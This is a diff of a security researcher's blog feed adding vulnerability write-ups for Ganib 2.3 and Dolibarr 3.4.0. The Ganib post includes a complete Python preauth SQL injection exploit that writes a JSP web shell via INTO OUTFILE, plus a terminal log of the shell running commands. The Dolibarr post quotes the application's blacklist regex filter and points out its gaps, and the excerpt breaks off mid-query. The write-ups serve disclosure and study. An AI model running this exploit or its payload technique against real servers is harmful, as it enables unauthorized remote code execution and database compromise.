@@ -4,7 +4,7 @@
   <title><![CDATA[forelsec]]></title>
   <link href="http://hatRiot.github.io/atom.xml" rel="self"/>
   <link href="http://hatRiot.github.io/"/>
-  <updated>2014-03-03T01:31:34-07:00</updated>
+  <updated>2014-03-03T23:18:38-07:00</updated>
   <id>http://hatRiot.github.io/</id>
   <author>
     <name><![CDATA[Bryan Alexander]]></name>
@@ -21,6 +21,435 @@
     <content type="html"><![CDATA[<p>This isn&rsquo;t a real introduction post, just a note that I&rsquo;m migrating from Google Blogger to Github Pages with Octopress.  So far it&rsquo;s great.  I&rsquo;m going to be slowly migrating all posts over from Blogger into here, though I may skip a few early posts that aren&rsquo;t as interesting.</p>
 
 <p>Hopefully it provides me with the functionality that I&rsquo;ve been looking for.</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[ganib project management 2.3 SQLi]]></title>
+    <link href="http://hatRiot.github.io/blog/2014/02/24/ganib-project-management-2.3-sqli/"/>
+    <updated>2014-02-24T22:03:07-07:00</updated>
+    <id>http://hatRiot.github.io/blog/2014/02/24/ganib-project-management-2.3-sqli</id>
+    <content type="html"><![CDATA[<p><a href="http://www.ganib.com/">Ganib</a> is a project management tool supporting all the glorious project management utilities.  The latest version, 2.3 and below, is vulnerable to multiple SQL injection vectors.</p>
+
+<p>The first SQL injection vector is a post-auth UPDATE injection in changetheme.jsp:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>String theme = request.getParameter("theme");
+</span><span class='line'>User user = (User) pageContext.getAttribute("user", PageContext.SESSION_SCOPE);
+</span><span class='line'>if( user != null && user.getID() != null ) {
+</span><span class='line'>    DBBean db = new DBBean();
+</span><span class='line'>    
+</span><span class='line'>    try {
+</span><span class='line'>        String query = "UPDATE PN_PERSON SET THEME_ID = '" + theme + "' WHERE PERSON_ID = " + user.getID();
+</span><span class='line'>        db.prepareStatement(query);
+</span><span class='line'>        db.executePrepared();
+</span><span class='line'>    } finally {
+</span><span class='line'>        db.release();
+</span><span class='line'>    }</span></code></pre></td></tr></table></div></figure>
+
+
+<p>It&rsquo;s obvious where the flaw is.</p>
+
+<p>The most serious of the vectors is a preauth SQL injection vulnerability in the login POST request.  The issue with this is that user-controlled data is passed through a series of data objects, all of which fail to sanitize the data, but all of which assume the data is cleansed.</p>
+
+<p>The initial POST request is sent to <code>LoginProcess.jsp</code>.  This builds the LogManager object, which instantiates the object with our provided username, password, and user domain; all unsanitized:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>// Grab parameters from Login form
+</span><span class='line'>String secure = request.getParameter ("secure");
+</span><span class='line'>String username = request.getParameter ("J_USERNAME");
+</span><span class='line'>username = username == null ? u_name : username;
+</span><span class='line'>String password = request.getParameter ("J_PASSWORD");
+</span><span class='line'>password = password == null ? pwd : password;
+</span><span class='line'>String userDomain = request.getParameter("userDomain");
+</span><span class='line'>
+</span><span class='line'>[...]
+</span><span class='line'>
+</span><span class='line'>else 
+</span><span class='line'>    loginManager.createLoginContext(username, password, userDomain);</span></code></pre></td></tr></table></div></figure>
+
+
+<p>And the request, for reference:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>POST /LoginProcessing.jsp HTTP/1.1
+</span><span class='line'>Host: 192.168.1.219:8080
+</span><span class='line'>User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:26.0) Gecko/20100101 Firefox/26.0
+</span><span class='line'>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+</span><span class='line'>Accept-Language: en-US,en;q=0.5
+</span><span class='line'>Accept-Encoding: gzip, deflate
+</span><span class='line'>Referer: http://192.168.1.219:8080/
+</span><span class='line'>Cookie: JSESSIONID=747813A1BB393D97FD577E2010F25F37; g.s=CE7D2D0E1293623B73B56FC239BFA23D; g.r=1; _sid=; _styp=; JSPRootURL=; cookies=true
+</span><span class='line'>Connection: keep-alive
+</span><span class='line'>Content-Type: application/x-www-form-urlencoded
+</span><span class='line'>Content-Length: 109
+</span><span class='line'>
+</span><span class='line'>theAction=submit&J_USERNAME=bob%40bob.com&J_PASSWORD=password&language=en&remember_checkbox=on&userDomain=1000</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Once the loginManager is instantiated, <code>loginManager.completeLogin</code> is called.  This instantiates the <code>DomainAuthenticator</code> object and attempts to login:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>try
+</span><span class='line'>{
+</span><span class='line'>    domainAuthenticator = DomainAuthenticator.getInstance(this.loginContext.getDomainID(), this.loginContext.getUsername(), this.loginContext.getClearTextPassword());
+</span><span class='line'>    domainAuthenticator.authenticate(shadowLogin, isFromSSOLogin);
+</span><span class='line'>    statusCode = LoginStatusCode.SUCCESS;
+</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The <code>DomainAuthenticator</code> object manages authentication with the various supported methods; domain, SSO, etc.  If you&rsquo;re still following with me, the traversal path thus far can be visualized below:</p>
+
+<p><img class="center" src="http://2.bp.blogspot.com/-ohiBWXtvQso/Uu6nxy-RQ-I/AAAAAAAAAzQ/9vL6HGqG4Ks/s1600/flow.jpg"></p>
+
+<p>Note that, so far, none of the provided input has yet to be sanitized.</p>
+
+<p>The <code>DomainAuthenticator</code> constructor first instantiates a <code>UserDomain</code> object:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>private DomainAuthenticator(String domainID, String username, String clearTextPassword)
+</span><span class='line'>  throws DomainException
+</span><span class='line'>{
+</span><span class='line'>  try
+</span><span class='line'>  {
+</span><span class='line'>    UserDomain domain = new UserDomain();
+</span><span class='line'>    domain.setID(domainID);
+</span><span class='line'>    domain.load();
+</span><span class='line'>    setDomain(domain);
+</span><span class='line'>
+</span><span class='line'>    setAuthenticationContext(new AuthenticationContext(domainID, username, clearTextPassword));
+</span><span class='line'>  }</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Once the <code>UserDomain</code> object is initialized, the <code>domainID</code> is set by our unsanitized <code>userDomain</code> parameter, and the load function is invoked.  The <code>load</code> function is as follows:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'> public void load()
+</span><span class='line'>    throws PersistenceException
+</span><span class='line'>  {
+</span><span class='line'>    DBBean db = new DBBean();
+</span><span class='line'>    try
+</span><span class='line'>    {
+</span><span class='line'>      load(db);
+</span><span class='line'>    } finally {
+</span><span class='line'>      db.release();
+</span><span class='line'>    }
+</span><span class='line'>  }
+</span><span class='line'>
+</span><span class='line'>  public void load(DBBean db)
+</span><span class='line'>    throws PersistenceException
+</span><span class='line'>  {
+</span><span class='line'>    loadProperties(db);
+</span><span class='line'>
+</span><span class='line'>    loadUsers(db);
+</span><span class='line'>
+</span><span class='line'>    loadSupportedConfigurations(db);
+</span><span class='line'>  }</span></code></pre></td></tr></table></div></figure>
+
+
+<p>A <code>DBBean</code> object is created, and passed into an overloaded <code>load</code> function.  This runs three other functions to build the <code>DBBean</code> object; the call we&rsquo;re interested in is <code>loadUsers</code>:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'> public void loadUsers(DBBean db)
+</span><span class='line'>    throws PersistenceException
+</span><span class='line'>  {
+</span><span class='line'>    if (this.domainID == null) {
+</span><span class='line'>      throw new PersistenceException("UserDomain.loadUsers() can not proceed because the domainID is null");
+</span><span class='line'>    }
+</span><span class='line'>
+</span><span class='line'>    if (this.userCollection == null) {
+</span><span class='line'>      this.userCollection = new DomainUserCollection();
+</span><span class='line'>    }
+</span><span class='line'>
+</span><span class='line'>    this.userCollection.setDomainID(getID());
+</span><span class='line'>    this.userCollection.load(db);
+</span><span class='line'>  }</span></code></pre></td></tr></table></div></figure>
+
+
+<p>This call invokes yet another object, <code>DomainUserCollection</code>.  Once instantiated, our yet to be sanitized <code>userDomain</code> parameter is set in the object, and the <code>load</code> function is invoked.  This function, finally, takes us to our vulnerable SQL query:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'> protected void load(DBBean dbean)
+</span><span class='line'>    throws PersistenceException
+</span><span class='line'>  {
+</span><span class='line'>    String qstrLoadUsersForDomain = "SELECT U.USER_ID, U.USERNAME, U.DISPLAY_NAME,U.USER_STATUS FROM PN_USER_VIEW U WHERE DOMAIN_ID = " + getDomainID();
+</span><span class='line'>
+</span><span class='line'>    if (this.domainID == null) {
+</span><span class='line'>      throw new PersistenceException("DomainUserCollection.load() was unable to load the users for this domain because of an invalid (null) domainID");
+</span><span class='line'>    }
+</span><span class='line'>
+</span><span class='line'>  [...]
+</span><span class='line'>
+</span><span class='line'>  dbean.executeQuery(qstrLoadUsersForDomain);</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Here we can see that our controlled <code>userDomain</code> parameter is injected directly into the SQL query.  This can be exploited using a UNION SELECT with four columns to write a JSP shell out.</p>
+
+<p>Because of the way the Tomcat applicaton&rsquo;s web.xml is configured, we cannot drop a JSP into the ROOT folder and expect it to run.  Have no fear, as the default Tomcat install built into Ganib includes both /manager and /host-manager, which provide perfect receptacles for our dumped shell:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@jali:~/exploits# python ganib_sqli.py -i 192.168.1.64 -p /var/www/ganib/tomcat/webapps/host-manager -j ./cmd.jsp
+</span><span class='line'>[!] Dropping ./cmd.jsp on 192.168.1.64...
+</span><span class='line'>[!] Dropped at /wjdll.jsp
+</span><span class='line'>root@jali:~/exploits# python -c 'import requests; print requests.get("http://192.168.1.64:8080/host-manager/wjdll.jsp?cmd=pwd").content'
+</span><span class='line'>
+</span><span class='line'>/var/www/ganib/tomcat/bin
+</span><span class='line'>
+</span><span class='line'>    1    2    3
+</span><span class='line'>
+</span><span class='line'>root@jali:~/exploits# </span></code></pre></td></tr></table></div></figure>
+
+
+<p>There will be some issues if Ganib is running in a directory that MySQL does not have permissions to write to, and considering this is a completely portable install, it could be running from anywhere.  Of course, you can also make use of the dozens of stored procedures Ganib installs by default; such as APPLY_ADMIN_PERMISSIONS, REMOVEUSER, or CREATE_PARENT_ADMIN_ROLE; this would simply turn the query from a UNION SELECT into OR PROCEDURE().</p>
+
+<p>I did a quick grep through the remainder of the code base and found multiple other injection vectors; most, however, were postauth.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+<span class='line-number'>54</span>
+<span class='line-number'>55</span>
+<span class='line-number'>56</span>
+<span class='line-number'>57</span>
+<span class='line-number'>58</span>
+<span class='line-number'>59</span>
+<span class='line-number'>60</span>
+<span class='line-number'>61</span>
+<span class='line-number'>62</span>
+<span class='line-number'>63</span>
+<span class='line-number'>64</span>
+<span class='line-number'>65</span>
+<span class='line-number'>66</span>
+<span class='line-number'>67</span>
+<span class='line-number'>68</span>
+<span class='line-number'>69</span>
+<span class='line-number'>70</span>
+<span class='line-number'>71</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'># Exploit title: Ganib 2.0 SQLi
+</span><span class='line'># Date: 02/02/2014
+</span><span class='line'># Exploit author: drone (@dronesec)
+</span><span class='line'># More information:
+</span><span class='line'># Vendor homepage: http://www.ganib.com/
+</span><span class='line'># Software link: http://downloads.sourceforge.net/project/ganib/Ganib-2.0/Ganib-2.0_with_jre.zip
+</span><span class='line'># Version: &lt;= 2.3
+</span><span class='line'># Fixed in: 2.4
+</span><span class='line'># Tested on: Ubuntu 12.04 (apparmor disabled) / WinXP SP3
+</span><span class='line'>
+</span><span class='line'>from argparse import ArgumentParser
+</span><span class='line'>import sys
+</span><span class='line'>import string
+</span><span class='line'>import random
+</span><span class='line'>import requests
+</span><span class='line'>
+</span><span class='line'>""" Ganib 2.0 preauth SQLi PoC
+</span><span class='line'>    @dronesec
+</span><span class='line'>"""
+</span><span class='line'>
+</span><span class='line'>def loadJSP(options):
+</span><span class='line'>    data = ''
+</span><span class='line'>
+</span><span class='line'>    try:
+</span><span class='line'>        with open(options.jsp) as f:
+</span><span class='line'>            for line in f.readlines():
+</span><span class='line'>                data += line.replace("\"", "\\\"").replace('\n', '')
+</span><span class='line'>    except Exception, e:
+</span><span class='line'>        print e
+</span><span class='line'>        sys.exit(1)
+</span><span class='line'>
+</span><span class='line'>    return data
+</span><span class='line'>
+</span><span class='line'>def run(options):
+</span><span class='line'>    print '[!] Dropping %s on %s...' % (options.jsp, options.ip)
+</span><span class='line'>
+</span><span class='line'>    url = "http://{0}:8080/LoginProcessing.jsp".format(options.ip)
+</span><span class='line'>    shell = ''.join(random.choice(string.ascii_lowercase+string.digits) for x in range(5))
+</span><span class='line'>
+</span><span class='line'>    exploit = '1 UNION SELECT "{0}","1","2","3" INTO OUTFILE "{1}"'
+</span><span class='line'>    exploit = exploit.format(loadJSP(options), options.path + '/%s.jsp' % shell)
+</span><span class='line'>
+</span><span class='line'>    data = { "theAction" : "submit",
+</span><span class='line'>             "J_USERNAME" : "test",
+</span><span class='line'>             "J_PASSWORD" : "test",
+</span><span class='line'>             "language" : "en",
+</span><span class='line'>             "remember_checkbox" : "on",
+</span><span class='line'>             "userDomain" : exploit
+</span><span class='line'>           }
+</span><span class='line'>
+</span><span class='line'>    res = requests.post(url, data=data)
+</span><span class='line'>    if res.status_code is 200:
+</span><span class='line'>        print '[!] Dropped at /{0}.jsp'.format(shell)
+</span><span class='line'>    else:
+</span><span class='line'>        print '[!] Failed to drop JSP (HTTP {0})'.format(res.status_code)
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>def parse():
+</span><span class='line'>    parser = ArgumentParser()
+</span><span class='line'>    parser.add_argument("-i", help='Server ip address', action='store', dest='ip',
+</span><span class='line'>                        required=True)
+</span><span class='line'>    parser.add_argument("-p", help='Writable web path (/var/www/ganib)', dest='path',
+</span><span class='line'>                        action='store', default='/var/www/ganib')
+</span><span class='line'>    parser.add_argument("-j", help="JSP to deploy", dest='jsp', action='store')
+</span><span class='line'>
+</span><span class='line'>    options = parser.parse_args()
+</span><span class='line'>    options.path = options.path if options.path[-1] != '/' else options.path[:-1]
+</span><span class='line'>    return options
+</span><span class='line'>
+</span><span class='line'>if __name__ == "__main__":
+</span><span class='line'>    run(parse())</span></code></pre></td></tr></table></div></figure>
+
 ]]></content>
   </entry>
   
@@ -142,6 +571,2724 @@
 <p>Judging by this information, it doesn&rsquo;t appear that we can remotely invoke the same way we did with 3.x/4.x.  This is the fundamental issue with several of the available open source JBoss tools (Metasploit); none of them take into account the changes between different versions of JBoss.</p>
 
 <p>Although I have yet to discover a way to map requests to the invoker (I&rsquo;m not entirely sure its possible) in these later versions, I have a suspicion that we may be able to map these requests by serializing objects out.  More on this, and my exploitation tool, soon.</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Dolibarr 3.4.0 - Multiple Vulnerabilities]]></title>
+    <link href="http://hatRiot.github.io/blog/2013/10/14/dolibarr-3.4.0-multiple-vulnerabilities/"/>
+    <updated>2013-10-14T23:13:15-06:00</updated>
+    <id>http://hatRiot.github.io/blog/2013/10/14/dolibarr-3.4.0-multiple-vulnerabilities</id>
+    <content type="html"><![CDATA[<p><a href="http://www.dolibarr.org/">Dolibarr</a> is an open source, enterprise-grade ERP/CRM application developed in PHP.  The latest stable release, 3.4.0, is vulnerable to a host of remotely exploitable post and pre auth vulnerabilities, along with several seriously mind-bending security/architecture choices.  These vulnerabilities and issues were privately disclosed to the vendor, and the SQLi was patched in version 3.4.1.  However, their sanitization methods were not fixed, and no mention was made on a future patch.  Other SQLi vectors are likely.</p>
+
+<p>There are multiple SQL injections that lead to a compromise of the availability/integrity of the database or web server.  The scenario and context of the vulnerabilities are rather interesting, as multiple blacklisting techniques are used by Dolibarr in an attempt to mitigate malicious queries slipping through; nevertheless, as we know, blacklisting never works.  No parameterized queries are to be found in source.</p>
+
+<p>The following is included in each page and used for &ldquo;sanitization&rdquo; <code>main.inc.php</code>:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>function analyse_sql_and_script(&$var, $type)
+</span><span class='line'>{
+</span><span class='line'>    if (is_array($var))
+</span><span class='line'>    {
+</span><span class='line'>        foreach ($var as $key =&gt; $value)
+</span><span class='line'>        {
+</span><span class='line'>            if (analyse_sql_and_script($value,$type))
+</span><span class='line'>            {
+</span><span class='line'>                $var[$key] = $value;
+</span><span class='line'>            }
+</span><span class='line'>            else
+</span><span class='line'>            {
+</span><span class='line'>                print 'Access refused by SQL/Script injection protection in main.inc.php';
+</span><span class='line'>                exit;
+</span><span class='line'>            }
+</span><span class='line'>        }
+</span><span class='line'>        return true;
+</span><span class='line'>    }
+</span><span class='line'>    else
+</span><span class='line'>    {
+</span><span class='line'>        return (test_sql_and_script_inject($var,$type) &lt;= 0);
+</span><span class='line'>    }
+</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Pretty typical recursive function for sanitizing input.  The following performs the actual sanity checking:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>function test_sql_and_script_inject($val, $type)
+</span><span class='line'>{
+</span><span class='line'>    $sql_inj = 0;
+</span><span class='line'>    // For SQL Injection (only GET and POST are used to be included into bad escaped SQL requests)
+</span><span class='line'>    if ($type != 2)
+</span><span class='line'>    {
+</span><span class='line'>        $sql_inj += preg_match('/delete[\s]+from/i', $val);
+</span><span class='line'>        $sql_inj += preg_match('/create[\s]+table/i', $val);
+</span><span class='line'>        $sql_inj += preg_match('/update.+set.+=/i', $val);
+</span><span class='line'>        $sql_inj += preg_match('/insert[\s]+into/i', $val);
+</span><span class='line'>        $sql_inj += preg_match('/select.+from/i', $val);
+</span><span class='line'>        $sql_inj += preg_match('/union.+select/i', $val);
+</span><span class='line'>        $sql_inj += preg_match('/(\.\.%2f)+/i', $val);
+</span><span class='line'>    }
+</span><span class='line'>    // For XSS Injection done by adding javascript with script
+</span><span class='line'>    // This is all cases a browser consider text is javascript:
+</span><span class='line'>    // When it found '&lt;script', 'javascript:', '&lt;style', 'onload\s=' on body tag, '="&' on a tag size with old browsers
+</span><span class='line'>    // All examples on page: http://ha.ckers.org/xss.html#XSScalc
+</span><span class='line'>    $sql_inj += preg_match('/&lt;script/i', $val);
+</span><span class='line'>    if (! defined('NOSTYLECHECK')) $sql_inj += preg_match('/&lt;style/i', $val);
+</span><span class='line'>    $sql_inj += preg_match('/base[\s]+href/i', $val);
+</span><span class='line'>    if ($type == 1)
+</span><span class='line'>    {
+</span><span class='line'>        $sql_inj += preg_match('/javascript:/i', $val);
+</span><span class='line'>        $sql_inj += preg_match('/vbscript:/i', $val);
+</span><span class='line'>    }
+</span><span class='line'>    // For XSS Injection done by adding javascript closing html tags like with onmousemove, etc... (closing a src or href tag with not cleaned param)
+</span><span class='line'>    if ($type == 1) $sql_inj += preg_match('/"/i', $val);          // We refused " in GET parameters value
+</span><span class='line'>    if ($type == 2) $sql_inj += preg_match('/[\s;"]/', $val);     // PHP_SELF is an url and must match url syntax
+</span><span class='line'>    return $sql_inj;
+</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>
+
+
+<p>It&rsquo;s quite clear that the blacklisting approach is inefficient; particularly the cross-site scripting protection.  The SQLi blacklisting doesn&rsquo;t restrict INTO OUTFILE/DUMPFILE, meaning with a well-tuned SQL injection we can throw a web shell onto the box.</p>
+
+<p>Let&rsquo;s take a look at one such vulnerable query <code>contact/fiche.php</code>:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>if ($action == 'confirm_delete' && $confirm == 'yes' && $user-&gt;rights-&gt;societe-&gt;contact-&gt;supprimer)
+</span><span class='line'>    {
+</span><span class='line'>        $result=$object-&gt;fetch($_GET["id"]);</span></code></pre></td></tr></table></div></figure>
+
+
+<p><code>contact/class/contact.class.php</code></p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>function fetch($id, $user=0)
+</span><span class='line'>    {
+</span><span class='line'>        global $langs;
+</span><span class='line'>
+</span><span class='line'>        $langs-&gt;load("companies");
+</span><span class='line'>
+</span><span class='line'>        $sql = "SELECT c.rowid, c.fk_soc, c.civilite as civilite_id, c.lastname, c.firstname,";
+</span><span class='line'>        $sql.= " c.address, c.zip, c.town,";
+</span><span class='line'>        $sql.= " c.fk_pays as country_id,";
+</span><span class='line'>        $sql.= " c.fk_departement,";
+</span><span class='line'>        $sql.= " c.birthday,";
+</span><span class='line'>        $sql.= " c.poste, c.phone, c.phone_perso, c.phone_mobile, c.fax, c.email, c.jabberid,";
+</span><span class='line'>        $sql.= " c.priv, c.note_private, c.note_public, c.default_lang, c.no_email, c.canvas,";
+</span><span class='line'>        $sql.= " c.import_key,";
+</span><span class='line'>        $sql.= " p.libelle as country, p.code as country_code,";
+</span><span class='line'>        $sql.= " d.nom as state, d.code_departement as state_code,";
+</span><span class='line'>        $sql.= " u.rowid as user_id, u.login as user_login,";
+</span><span class='line'>        $sql.= " s.nom as socname, s.address as socaddress, s.zip as soccp, s.town as soccity, s.default_lang as socdefault_lang";
+</span><span class='line'>        $sql.= " FROM ".MAIN_DB_PREFIX."socpeople as c";
+</span><span class='line'>        $sql.= " LEFT JOIN ".MAIN_DB_PREFIX."c_pays as p ON c.fk_pays = p.rowid";
+</span><span class='line'>        $sql.= " LEFT JOIN ".MAIN_DB_PREFIX."c_departements as d ON c.fk_departement = d.rowid";
+</span><span class='line'>        $sql.= " LEFT JOIN ".MAIN_DB_PREFIX."user as u ON c.rowid = u.fk_socpeople";
